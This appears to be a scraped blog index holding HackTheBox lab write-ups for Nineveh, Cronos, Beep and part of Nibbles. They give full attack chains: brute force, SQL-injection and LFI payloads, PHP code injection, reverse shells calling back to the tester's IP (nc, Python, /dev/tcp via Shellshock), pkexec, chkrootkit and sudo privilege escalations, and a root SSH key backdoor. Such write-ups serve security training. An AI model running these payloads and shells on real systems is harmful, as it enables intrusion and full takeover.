Megapixels : 1.1 No comments Check if there are any files embeded in the image w/ binwalk, there is! ┌──(root💀kali)-[~/htb/nineveh] └─# binwalk -eM --run-as=root nineveh.png Scan Time: 2022-08-24 01:41:19 Target File: /root/htb/nineveh/nineveh.png MD5 Checksum: 353b8f5a4578e4472c686b6e1f15c808 Signatures: 411 DECIMAL HEXADECIMAL DESCRIPTION ------------------------------------------------------------------------------ 0 0x0 PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced 84 0x54 Zlib compressed data, best compression 2881744 0x2BF8D0 POSIX tar archive (GNU) Scan Time: 2022-08-24 01:41:20 Target File: /root/htb/nineveh/_nineveh.png.extracted/54 MD5 Checksum: d41d8cd98f00b204e9800998ecf8427e Signatures: 411 DECIMAL HEXADECIMAL DESCRIPTION ------------------------------------------------------------------------------ Scan Time: 2022-08-24 01:41:20 Target File: /root/htb/nineveh/_nineveh.png.extracted/secret/nineveh.priv MD5 Checksum: f426d661f94b16292efc810ebb7ea305 Signatures: 411 DECIMAL HEXADECIMAL DESCRIPTION ------------------------------------------------------------------------------ 0 0x0 PEM RSA private key Scan Time: 2022-08-24 01:41:20 Target File: /root/htb/nineveh/_nineveh.png.extracted/secret/nineveh.pub MD5 Checksum: 6b60618d207ad97e76664174e805cfda Signatures: 411 DECIMAL HEXADECIMAL DESCRIPTION ------------------------------------------------------------------------------ 0 0x0 OpenSSH RSA public key secret directory This is probably what the note is refering to Contains SSH private key, however TCP/22 (SSH) is not up, we might be able to use it later. TCP/443 (HTTPS) - phpLiteAdmin v1.9 RCE Proceed to db we see phpLiteAdmin v1.9, the moment I saw this, I knew by combining the LFI exploit and phpLiteAdmin v1.9 exploit, we can obtain a low-privilege shell. Vulnhub Zico2 - InitialFoothold has the same exploit! Bruteforce w/ hydra again ┌──(root💀kali)-[~/htb/nineveh] └─# hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip https-post-form &quot;/db/index.php :password=^PASS^&amp;amp;remember=yes&amp;amp;login=Log+In&amp;amp;proc_login=true:Incorrect password.&quot; -VI [443][http-post-form] host: 10.10.10.43 login: admin password: password123 admin:password123 Search exploits for phpLiteAdmin Exploit Title Path PHPLiteAdmin 1.9.3 - Remote PHP Code Injection php/webapps/24044.txt Try php/webapps/24044.txt How does the exploit work? An attacker is able to create a Database w/ a php extension and insert PHP code as text fields in the Database, by accessing the file, PHP code is executed. Create a new database called ninevehNotes.php Only files that are named ninevehNotes.&amp;lt;any ext&amp;gt; will be processed Create table called RCE Add field name w/ a default value of a PHP Code to read /etc/passwd Default Value &amp;lt;?php system(&quot;cat /etc/passwd&quot;);?&amp;gt; View location of database /var/tmp/ninevehNotes.php We will head back to the LFI exploit TCP/80 (HTTP) - LFI2RCE Include /var/tmp/ninevehNotes.php, it works! # Current Dir /var/www/html/department # ninevehNotes.php location /var/tmp/ninevehNotes.php # Payload /manage.php?notes=../../../tmp/ninevehNotes.php 1. ../../../ : goes back 3 dir = /var 2. /tmp/files : cd into /tmp = /var/tmp/ 3. ninevehNotes.php : the file we want Create another table called RCE2 Add field name w/ a default value of a PHP Code to invoke a reverse shell &amp;lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.31 4444 &amp;gt;/tmp/f&quot;);?&amp;gt; Start listener Execute reverse shell by including ninevehNotes.php Shell obtained Obtain a more stable shell $ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; www-data@nineveh:/home/amrois$ Privilege Escalation - 1Amrois - Via SSH Private Key Earlier, we found SSH private key, transfer it to http://nineveh.htb www-data@nineveh:/tmp$ wget 10.10.14.31/nineveh.priv --2022-08-23 14:34:21-- http://10.10.14.31/nineveh.priv Connecting to 10.10.14.31:80... connected. HTTP request sent, awaiting response... 200 OK Length: 1675 (1.6K) [application/octet-stream] Saving to: &#39;nineveh.priv&#39; nineveh.priv 100%[==============================================&amp;gt;] 1.64K --.-KB/s in 0s 2022-08-23 14:34:21 (262 MB/s) - &#39;nineveh.priv&#39; saved [1675/1675] Change permission of nineveh.priv and SSH www-data@nineveh:/tmp$ chmod 600 nineveh.priv www-data@nineveh:/tmp$ ssh amrois@localhost -i nineveh.priv Obtained amrois shell &amp;amp; User Flag 390ff4e95074a5a0499f8e065fcedce9 Root - Via CVE-2021-4034 Found something interesting w/ linpeas.sh CVE-2021-4034 Try CVE-2021-4034.py How does the exploit work? Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged processes. Due to an improper implementation of the pkexec tool, an out-of-bounds memory access can be leveraged by a local attacker to escalate their privileges to system root. Download Exploit Transfer to nineveh.htb &amp;amp; Exploit Obtained Root Shell &amp;amp; Root Flag 3fa9f72b3965a409759533e147293627 Obtain a persitent/stable root access Create private key for Amorois amrois@nineveh:/tmp$ ssh-keygen -t rsa Create /root/.ssh # mkdir -p /root/.ssh Place Amrois public key into /root/.ssh/authorized_keys echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD6ItIHY3OMLlsiLCB0FlW7Q5kGTHbORLFAxKzj3xS3mic7t2GDgwOEX2ZZQF5QVJQlRkZ/OGU3Fc++TCtKXSBvaWjAs3DIqaucyfaOaJ/MVi4sVzpRB4diErdjsGStx81QcoV8vl1o+GGHSjIHJsBbuVirVrE665RUu4M62tdk8bzzRj8j7gAVPOxYPO6UIQfjtA3n80cGCQnRLRhQivO4icxo+neiP/W9esV/JwjTYUzowynR86PF+ae9ABkdUveBQqWso8tI7/pGE9DycNLgfaXR9mGwH1ZQzySiG4mlyty568GCQvvhWkryHG4WhqE4NKbOUJlgvGXUevl/h3Rl amrois@nineveh&quot; &amp;gt; /root/.ssh/authorized_keys Change permission of authorized_keys chmod 700 /root/.ssh chmod 600 /root/.ssh/authorized_keys SSH w/ Amorois private key amrois@nineveh:~/.ssh$ ssh -i yes root@localhost Privilege Escalation - 2Root - Chrookit Exploit Found something interesting w/ pspy64 chkrootkit is executed as root. Search exploits for chkrootkit Exploit Title Path Chkrootkit 0.49 - Local Privilege Escalation linux/local/33899.txt Try 33899.txt How does the exploit work? The line &#39;file_port=$file_port $i&#39; will execute all files specified in $SLAPPER_FILES as the user chkrootkit is running (usually root), if $file_port is empty, because of missing quotation marks around the variable assignment. /tmp/update will be executed as root due to the vulnerability Create script to set SUID bit on /bin/bash amrois@nineveh:~$ nano /tmp/update cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash amrois@nineveh:~$ chmod +x /tmp/update Wait for chkrootkit to execute Obtained Root Shell " }, { "title": "HackTheBox - Cronos", "url": "/posts/Cronos/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "linux-priv-esc/cronjob, exploit/command-injection, exploit/sqli/auth-bypass, tcp/53-dns", "date": "2022-08-23 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a DNS enumeration, revealing several subdomains. After enumerating the subdomains, admin.cronos.htb is susceptible to SQLi authentication bypass and a command injection exploit, allowing us to obtain a low-privilege/www-data shellFor the privilege escalation part, there are 2 ways to do it. After enumerating the system, a cronjob is executing a php script as root is found, the directory where the script is executed is RWX by www-data, allowing us to replace the binary/script w/ a php reverse shell, allowing us to obtain a root shell.The other way is to add a Laravel Command Scheduler schedule that will execute a reverse shell/create a bash shell w/ SUID bit set instead of replacing the script that is executed as root.If you wish to practice more DNS enumeration, try HackTheBox Trick Column Details Box Name Cronos IP 10.10.10.13 Points - Difficulty Medium Creator ch4p Release Date 10.10.10.13 ReconTCP/53 (DNS)Zone Transfer - To find out more subdomains┌──(root💀kali)-[~/htb]└─# dig axfr @10.10.10.13 cronos.htb; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.0-2-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr @10.10.10.13 cronos.htb; (1 server found);; global options: +cmdcronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800cronos.htb. 604800 IN NS ns1.cronos.htb.cronos.htb. 604800 IN A 10.10.10.13admin.cronos.htb. 604800 IN A 10.10.10.13ns1.cronos.htb. 604800 IN A 10.10.10.13www.cronos.htb. 604800 IN A 10.10.10.13cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800;; Query time: 36 msec;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP);; WHEN: Tue Aug 23 20:38:34 +08 2022;; XFR size: 7 records (messages 1, bytes 203) Subdomains admin.cronos.htb ns1.cronos.htb www.cronos.htb TCP/80 (HTTP)FFUF - Enumerate more subdomains┌──(root💀kali)-[~/htb]└─# ffuf -u http://10.10.10.13/ -H &quot;Host: FUZZ.cronos.htb&quot; -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fw 3534admin [Status: 200, Size: 1547, Words: 525, Lines: 57]www [Status: 200, Size: 2319, Words: 990, Lines: 86]:: Progress: [114441/114441] :: Job [1/1] :: 997 req/sec :: Duration: [0:01:58] :: Errors: 0 :: Subdomains admin.cronos.htb www.cronos.htb FFUF - cronos.htb┌──(root💀kali)-[~/htb]└─# ffuf -u http://cronos.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt css [Status: 301, Size: 306, Words: 20, Lines: 10]favicon.ico [Status: 200, Size: 0, Words: 1, Lines: 1].htpasswd [Status: 403, Size: 294, Words: 22, Lines: 12].htaccess [Status: 403, Size: 294, Words: 22, Lines: 12].hta [Status: 403, Size: 289, Words: 22, Lines: 12]index.php [Status: 200, Size: 2319, Words: 990, Lines: 86]js [Status: 301, Size: 305, Words: 20, Lines: 10]robots.txt [Status: 200, Size: 24, Words: 2, Lines: 3]server-status [Status: 403, Size: 298, Words: 22, Lines: 12]web.config [Status: 200, Size: 914, Words: 209, Lines: 24]:: Progress: [4615/4615] :: Job [1/1] :: 1070 req/sec :: Duration: [0:00:07] :: Errors: 0 :: web.configFFUF - admin.cronos.htbindex.php [Status: 200, Size: 1547, Words: 525, Lines: 57]FFUF - ns1.cronos.htbindex.html [Status: 200, Size: 11439, Words: 3534, Lines: 380]Initial FootholdTCP/80 (HTTP) - admin.cronos.htb SQLi Auth Bypass Add enumerated subdomains to /etc/hosts View web.config ┌──(root💀kali)-[~/htb/cronos/10.10.10.13/loot] └─# curl http://cronos.htb/web.config -s &amp;lt;configuration&amp;gt; &amp;lt;system.webServer&amp;gt; &amp;lt;rewrite&amp;gt; &amp;lt;rules&amp;gt; &amp;lt;rule name=&quot;Imported Rule 1&quot; stopProcessing=&quot;true&quot;&amp;gt; &amp;lt;match url=&quot;^(.*)/$&quot; ignoreCase=&quot;false&quot; /&amp;gt; &amp;lt;conditions&amp;gt; &amp;lt;add input=&quot;{REQUEST_FILENAME}&quot; matchType=&quot;IsDirectory&quot; ignoreCase=&quot;false&quot; negate=&quot;true&quot; /&amp;gt; &amp;lt;/conditions&amp;gt; &amp;lt;action type=&quot;Redirect&quot; redirectType=&quot;Permanent&quot; url=&quot;/{R:1}&quot; /&amp;gt; &amp;lt;/rule&amp;gt; &amp;lt;rule name=&quot;Imported Rule 2&quot; stopProcessing=&quot;true&quot;&amp;gt; &amp;lt;match url=&quot;^&quot; ignoreCase=&quot;false&quot; /&amp;gt; &amp;lt;conditions&amp;gt; &amp;lt;add input=&quot;{REQUEST_FILENAME}&quot; matchType=&quot;IsDirectory&quot; ignoreCase=&quot;false&quot; negate=&quot;true&quot; /&amp;gt; &amp;lt;add input=&quot;{REQUEST_FILENAME}&quot; matchType=&quot;IsFile&quot; ignoreCase=&quot;false&quot; negate=&quot;true&quot; /&amp;gt; &amp;lt;/conditions&amp;gt; &amp;lt;action type=&quot;Rewrite&quot; url=&quot;index.php&quot; /&amp;gt; &amp;lt;/rule&amp;gt; &amp;lt;/rules&amp;gt; &amp;lt;/rewrite&amp;gt; &amp;lt;/system.webServer&amp;gt; &amp;lt;/configuration&amp;gt; Nothing interesting is found Attempt SQLi Auth Bypass at admin.cronos.htb, it worked! # Payload &#39; OR 1=1# &#39; OR 1=1 -- - TCP/80 (HTTP) - admin.cronos.htb Command Injection After successfully login, there is a ping tool Attempt command injection, it worked! # Payload || which python Invoke reverse shell || python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.31&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39; Obtained Shell &amp;amp; User Flag eda31bb21d9893ca428d3d95f90c29f5 Privilege Escalation - 1Root - Via Cronjob, overwriting script Found something interesting w/ linpeas.sh A cronjob running as root is executing php /var/www/laravel/artisan schedule:run &amp;gt;&amp;gt; /dev/null 2&amp;gt;&amp;amp;1 every minute. Exploit Explanation Since we have RWX access on /var/www/laravel we are able to replace artisan w/ a php reverse shell, when the cronjob is executed, root shell is obtained Exploit Transfer php-reverse-shell.php to cronos.htb Remove /var/www/laravel/artsian Copy /tmp/php-reverse.php to /var/www/larvel/artisan www-data@cronos:/tmp$ mv php-reverse-shell.php artisan www-data@cronos:/tmp$ cp artisan /var/www/laravel/artisan Start listener Wait for cronjob to execute Obtained Root &amp;amp; Root Flag Privilege Escalation - 2Root - Via Cronjob, adding a task in Laravel Command Scheduler A cronjob running as root is executing php /var/www/laravel/artisan schedule:run &amp;gt;&amp;gt; /dev/null 2&amp;gt;&amp;amp;1 every minute. Exploit Explanation laravel command scheduler is being executed every minute as root, we are able to add a schedule that invokes a reverse shell, allowing us to obtain root. Exploit Defining schedules To be defined at app/Console/Kernel.php file schedule function Schedule Frequency Options Scheduling shell commands $schedule-&amp;gt;exec(&#39;command&#39;)-&amp;gt;everyMinute(); Find /app/Console/Kernel.php www-data@cronos:/tmp$ find / 2&amp;gt;/dev/null | grep Kernel.php /var/www/laravel/app/Console/Kernel.php Create reverse shell command to be executed every minute $schedule-&amp;gt;exec(&#39;cp /bin/bash /tmp/rootbashscheduler; chmod u+s /tmp/rootbashscheduler&#39;)-&amp;gt;everyMinute(); Add it to Kernel.php Wait for cronjob to execute Root Shell obtained www-data@cronos:/tmp$ /tmp/rootbashscheduler -p " }, { "title": "HackTheBox - Beep", "url": "/posts/Beep/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "exploit/file-inclusion/lfi, exploit/shell-shock, tcp/80-http/web-app-cms-exploit, linux-priv-esc/sudo/gtfo-bin", "date": "2022-08-23 00:00:00 +0800", "snippet": "OverviewThis machine has 4 ways to obtain an initial shell.For the 1st method, after a web enumeration at TCP/443 (HTTPS), it is discovered that Elastix running on the webserver. After searching possible exploits for Elastix, there are 4 available exploits for Elastix, since we have no way of finding out the version of Elastix, all exploits are tested. It is susceptible to Elastix 2.20 LFI , revealing credentials for root, SSH w/ found creds allowing us to obtain root user.For the 2nd method, the same LFI exploit is used, but instead of including file that contains credentials, we do SMTP log poisoning that leads to RCE, allowing us to invoke a reverse shell, obtaining asterisk shellFor the 3rd method, Elastix 2.2.0 / FreeBPX 2.10.0 - RCE exploit is used, we first have to find an open extension via svwar enumeration which allows us to trigger a phonecall to that specific extension and when the call is answered (or goes to voicemail), our payload is executed on the VOIP server, allowing us to invoke a reverse shell, obtaining asterisk shell.For the final method, after a web enumeration at TCP/10000 (HTTPS), it is discovered that cgi-bin scripts are running, shellshock exploit worked, allowing us to invoke a reverse shell to obtain root.For the privilege escalation, asterisk has sudoers entry that allows asterisk to run several binaries that have GTFOBins entry (nmap, chmod, yum), allowing us to privilege escalate to rootTakeawaysI learnt that if a web application version is unknown, you should try all exploits found on searchsploit to ensure that you have fully enumerated that service. Also, I learnt abit on VoIP enumeration from the FreeBPX exploit. Column Details Box Name Beep IP 10.10.10.7 Points - Difficulty Easy Creator ch4p Release Date 15-March-2017 ReconTCP/80 (HTTP) Redirects to TCP/443 (HTTPS)TCP/443 (HTTPS)FFUF301 GET 9l 28w 309c https://10.10.10.7/admin =&amp;gt; https://10.10.10.7/admin/403 GET 10l 30w 286c https://10.10.10.7/cgi-bin/403 GET 10l 30w 291c https://10.10.10.7/cgi-bin/.html301 GET 9l 28w 311c https://10.10.10.7/configs =&amp;gt; https://10.10.10.7/configs/200 GET 35l 111w 1785c https://10.10.10.7/config.php200 GET 1l 6w 894c https://10.10.10.7/favicon.ico301 GET 9l 28w 308c https://10.10.10.7/help =&amp;gt; https://10.10.10.7/help/301 GET 9l 28w 310c https://10.10.10.7/images =&amp;gt; https://10.10.10.7/images/200 GET 35l 111w 1785c https://10.10.10.7/index.php301 GET 9l 28w 308c https://10.10.10.7/lang =&amp;gt; https://10.10.10.7/lang/301 GET 9l 28w 308c https://10.10.10.7/libs =&amp;gt; https://10.10.10.7/libs/301 GET 9l 28w 308c https://10.10.10.7/mail =&amp;gt; https://10.10.10.7/mail/301 GET 9l 28w 311c https://10.10.10.7/modules =&amp;gt; https://10.10.10.7/modules/301 GET 9l 28w 309c https://10.10.10.7/panel =&amp;gt; https://10.10.10.7/panel/200 GET 35l 111w 1785c https://10.10.10.7/register.php200 GET 2l 4w 28c https://10.10.10.7/robots.txt301 GET 9l 28w 310c https://10.10.10.7/static =&amp;gt; https://10.10.10.7/static/301 GET 9l 28w 310c https://10.10.10.7/themes =&amp;gt; https://10.10.10.7/themes/301 GET 9l 28w 307c https://10.10.10.7/var =&amp;gt; https://10.10.10.7/var/ cgi-binTCP/10000 (MiniServ 1.57)NMAPPORT STATE SERVICE REASON VERSION10000/tcp open http syn-ack ttl 63 MiniServ 1.570 (Webmin httpd)Initial Foothold - 1TCP/443 (HTTPS) - Elastix 2.2.0 LFI to obtain creds https://beep.htb is running Elastix Server Tried to look for version in the source code, failed Search exploits for Elastix w/ searchsploit Exploit Title Path Elastix 2.2.0 - ‘graph.php’ Local File Inclusion php/webapps/37637.pl Elastix 2.x - Blind SQL Injection php/webapps/36305.txt Elastix &amp;lt; 2.5 - PHP Code Injection php/webapps/38091.php FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution php/webapps/18650.py We can ignore the XSS exploits There are only 4 exploits, we can try them all Try php/webapps/37637.pl This exploit allows you to do local file inclusion due to the lack of user input sanitization. Payload ... File: 37637.pl #LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;amp;module=Accounts&amp;amp;action ... This will include /etc/amportal.conf where login creds resides Exploit Obtain passwords ┌──(root💀kali)-[~/htb/beep/10.10.10.7/exploit] └─# curl -sk &#39;https://beep.htb//vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;amp;module=Accounts&amp;amp;action&#39; | head -n 40 | tail -n 11 | grep PASS | cut -d &#39;=&#39; -f2 | sort | uniq &amp;gt; password.txt amp109 amp111 jEhdIekWmdjE Obtain usernames ┌──(root💀kali)-[~/htb/beep/10.10.10.7/exploit] └─# curl -sk &#39;https://beep.htb//vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;amp;module=Accounts&amp;amp;action&#39; | head -n 40 | tail -n 11 | grep USER | cut -d &#39;=&#39; -f2 | sort | uniq &amp;gt; username.txt admin asteriskuser Bruteforce w/ burpsuite Results admin:jEhdIekWmdjE Not really useful because it does not lead to RCE Obtain users on the system by including /etc/passwd ┌──(root💀kali)-[~/htb/beep/10.10.10.7/exploit] └─# curl -ks &#39;https://beep.htb//vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&amp;amp;module=Accounts&amp;amp;action&#39; | cut -d &#39;:&#39; -f1 root fanis ┌──(root💀kali)-[~/htb/beep/10.10.10.7/exploit] └─# echo -e &quot;fanis\\nroot&quot; &amp;gt; ssh_username Initial Foothold - 2Elastix 2.2.0 LFI2RCE via Mail Log Poisoning Uses the same LFI exploit php/webapps/37637.pl, but instead of including a file that reveal creds, SMTP log poisoning is done, leading to RCE. How does it work A mail containing a webshell in its content is sent via SMTP and is stored in /var/mail/&amp;lt;user&amp;gt;, this allows RCE when including it. SMTP must be up We must have read access to /var/mail/&amp;lt;user&amp;gt; Exploit Obtain list of usernames by including /etc/passwd, and including the users until the file can be displayed OR Obtain user that is running the webserver by including /proc/self/status, and including that same user’s mail file Include /proc/self/status UID: 100 - asterisk Poison /var/mail/asterisk telnet $ip 25 MAIL FROM:0xyf RCPT TO: asterisk DATA &amp;lt;?php system($_GET[&#39;c&#39;]); ?&amp;gt; . QUIT Include /var/mail/asterisk &amp;amp; execute commands /vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&amp;amp;module=Accounts&amp;amp;action&amp;amp;c=id;whoami Start listener URL Encode payload ┌──(root💀kali)-[~/htb/beep] └─# hURL -U &quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.2/4444 0&amp;gt;&amp;amp;1&quot; Original :: /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.2/4444 0&amp;gt;&amp;amp;1 URL ENcoded :: %2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.2%2F4444%200%3E%261 Invoke reverse shell vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&amp;amp;module=Accounts&amp;amp;action&amp;amp;c=%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.2%2F4444%200%3E%261ex Shell Obtained More practice w/ the exact exploit Vulnhub Symfonos 1 - Mail Log Poisoning TCP/22 (SSH) - Bruteforce Fix SSH error Error: Unable to negotiate with 123.123.123.123 port 22: no matching key exchange method found. Their offer: diffie-hellman-group1-sha1 subl ~/.ssh/config Host 10.10.10.7 KexAlgorithms +diffie-hellman-group1-sha1 Bruteforce w/ hydra ┌──(root💀kali)-[~/htb/beep/10.10.10.7/exploit] └─# hydra -L ssh_username -P password.txt ssh://$ip -VI -t 1 Hydra v9.2 (c) 2021 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-23 02:10:36 [DATA] max 1 task per 1 server, overall 1 task, 6 login tries (l:2/p:3), ~6 tries per task [DATA] attacking ssh://10.10.10.7:22/ [ATTEMPT] target 10.10.10.7 - login &quot;fanis&quot; - pass &quot;amp109&quot; - 1 of 6 [child 0] (0/0) [ATTEMPT] target 10.10.10.7 - login &quot;fanis&quot; - pass &quot;amp111&quot; - 2 of 6 [child 0] (0/0) [ATTEMPT] target 10.10.10.7 - login &quot;fanis&quot; - pass &quot;jEhdIekWmdjE&quot; - 3 of 6 [child 0] (0/0) [ATTEMPT] target 10.10.10.7 - login &quot;root&quot; - pass &quot;amp109&quot; - 4 of 6 [child 0] (0/0) [ATTEMPT] target 10.10.10.7 - login &quot;root&quot; - pass &quot;amp111&quot; - 5 of 6 [child 0] (0/0) [ATTEMPT] target 10.10.10.7 - login &quot;root&quot; - pass &quot;jEhdIekWmdjE&quot; - 6 of 6 [child 0] (0/0) [22][ssh] host: 10.10.10.7 login: root password: jEhdIekWmdjE Lowered threads because there is some sort of bruteforce prevention root:jEhdIekWmdjE User &amp;amp; Root Flag 19afda200dff5c746e0e0081fcdd64f3 c28417887cd7e8cc9cf0ffde613de7a7 Initial Foothold - 3FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution FreeBPX FreePBX is a web-based open-source graphical user interface (GUI) that manages Asterisk, a voice over IP and telephony server. Try php/webapps/18650.py This exploit allows you to do RCE w/o authentication due to lack of input sanitization [Explanation](https://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ We have to find an open extension w/ svwar via bruteforce it until a valid one comes up ┌──(root💀kali)-[~/htb/beep] └─# svwar -m INVITE -e200-300 10.10.10.7 WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night +-----------+----------------+ | Extension | Authentication | +===========+================+ | 233 | reqauth | +-----------+----------------+ I had to try it multiple times to get reqauth extension Update 18650.py Start listener at port 443 Exploit ┌──(root💀kali)-[~/htb/beep/10.10.10.7/exploit] └─# python 18650.py Shell obtained IppSec TutorialInitial Foothold - 4TCP/10000 (HTTPS) - Blind Shellshock Make a login attempt at https://beep.htb:10000, we can see that we are redirected to session_login.cgi Since the file extension is .cgi, Shell Shock should be attempted Results of the command execution will not be reflected/outputed on the webpage, so we have to use tcpdump and execute a ping command. If tcpdump receives a ping, shell shock works. Start tcpdump ┌──(root💀kali)-[~/htb/beep/10.10.10.7/exploit] └─# tcpdump -i tun0 Attempt Shell Shock, it works! ┌──(root💀kali)-[~/htb/beep] └─# curl -A &quot;() { :;}; echo Content-Type: text/html; ping -c 1 10.10.14.2;&quot; https://beep.htb:10000 Start listener Invoke reverse shell ┌──(root💀kali)-[~/htb/beep] └─# curl -ks -A &quot;() { :;}; echo Content-Type: text/html; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.2/4444 0&amp;gt;&amp;amp;1;&quot; https://beep.htb:10000 Shell Obtained Privilege EscalationRoot - Via SUDO GTFOBins Check sudo access for asterisk bash-3.2$ sudo -l sudo -l Matching Defaults entries for asterisk on this host: env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot; User asterisk may run the following commands on this host: (root) NOPASSWD: /sbin/shutdown (root) NOPASSWD: /usr/bin/nmap (root) NOPASSWD: /usr/bin/yum (root) NOPASSWD: /bin/touch (root) NOPASSWD: /bin/chmod (root) NOPASSWD: /bin/chown (root) NOPASSWD: /sbin/service (root) NOPASSWD: /sbin/init (root) NOPASSWD: /usr/sbin/postmap (root) NOPASSWD: /usr/sbin/postfix (root) NOPASSWD: /usr/sbin/saslpasswd2 (root) NOPASSWD: /usr/sbin/hardware_detector (root) NOPASSWD: /sbin/chkconfig (root) NOPASSWD: /usr/sbin/elastix-helper nmap - has a GTFOBins entry chmod - has a GTFOBins entry yum - has a GTFOBins entry Exploit nmap &amp;amp; obtain Root Flag bash-3.2$ sudo nmap --interactive nmap&amp;gt; !bash Exploit chmod bash-3.2$ sudo chmod u+s /bin/bash Exploit yum # Paste entire thing TF=$(mktemp -d) cat &amp;gt;$TF/x&amp;lt;&amp;lt;EOF [main] plugins=1 pluginpath=$TF pluginconfpath=$TF EOF cat &amp;gt;$TF/y.conf&amp;lt;&amp;lt;EOF [main] enabled=1 EOF cat &amp;gt;$TF/y.py&amp;lt;&amp;lt;EOF import os import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version=&#39;2.1&#39; def init_hook(conduit): os.execl(&#39;/bin/sh&#39;,&#39;/bin/sh&#39;) EOF sudo yum -c $TF/x --enableplugin=y " }, { "title": "HackTheBox - Nibbles", "url": "/posts/Nibbles/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "tcp/80-http/web-app-cms-exploit", "date": "2022-08-22 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ web directory enumeration revealing files and directories that discloses the username, CMS version and login page of the webpage, allowing us to login as an admin user w/ a weak/guessable password. Also, with the version of the CMS available to us, we found out that it is vulnerable to a arbitrary file upload exploit, allowing us to upload a PHP reverse shell, obtaining a low-privilege/nibblers shell.On the system, the user nibblers has a sudoers entry that allows shelly to execute /home/nibbler/personal/stuff/monitor.sh as root. Since monitor.sh resides in nibbler’s home directory, we are able to create a script (monitor.sh) in nibbles’s home directory that will execute /bin/bash as sudo, giving us root Column Details Box Name Nibbles IP 10.10.10.75 Points - Difficulty Easy Creator mrb3n Release Date 13-Jan-2018 ReconTCP/80 (HTTP)FFUF No interesting files enumeratedCURLHTTP/1.1 200 OKDate: Sat, 20 Aug 2022 17:30:11 GMTServer: Apache/2.4.18 (Ubuntu)Last-Modified: Thu, 28 Dec 2017 20:19:50 GMTETag: &quot;5d-5616c3cf7fa77&quot;Accept-Ranges: bytesContent-Length: 93Vary: Accept-EncodingContent-Type: text/html&amp;lt;b&amp;gt;Hello world!&amp;lt;/b&amp;gt;&amp;lt;!-- /nibbleblog/ directory. Nothing interesting here! --&amp;gt; /nibbleblogInitial FootholdTCP/80 (HTTP) - Nibbleblog 4.0.3 Arbitrary File Upload w/ Metasploit Proceed to /nibbleblog, it is running nibbleblog CMS Directory enumerate nibbleblog ┌──(root💀kali)-[~/htb/nibbles] └─# ffuf -u http://nibbles.htb/nibbleblog/FUZZ -w /usr/share/wordlists/dirb/common.txt admin [Status: 301, Size: 321, Words: 20, Lines: 10] admin.php [Status: 200, Size: 1401, Words: 79, Lines: 27] content [Status: 301, Size: 323, Words: 20, Lines: 10] index.php [Status: 200, Size: 2987, Words: 116, Lines: 61] languages [Status: 301, Size: 325, Words: 20, Lines: 10] plugins [Status: 301, Size: 323, Words: 20, Lines: 10] README [Status: 200, Size: 4628, Words: 589, Lines: 64] themes [Status: 301, Size: 322, Words: 20, Lines: 10] :: Progress: [4615/4615] :: Job [1/1] :: 1114 req/sec :: Duration: [0:00:07] :: Errors: 0 :: admin.php README content Found nibbleblog version at nibbleblog/README ┌──(root💀kali)-[~/htb/nibbles] └─# curl http://nibbles.htb/nibbleblog/README -s | grep Version Version: v4.0.3 nibbleblog v4.0.3 Found username at nibbleblog/content/private/users.xml Found login page at /admin.php, successfully login w/ admin:nibbles, randomly guessed the password. Search exploits for nibbleblog 4.0.3 Exploit Title Path Nibbleblog 4.0.3 - 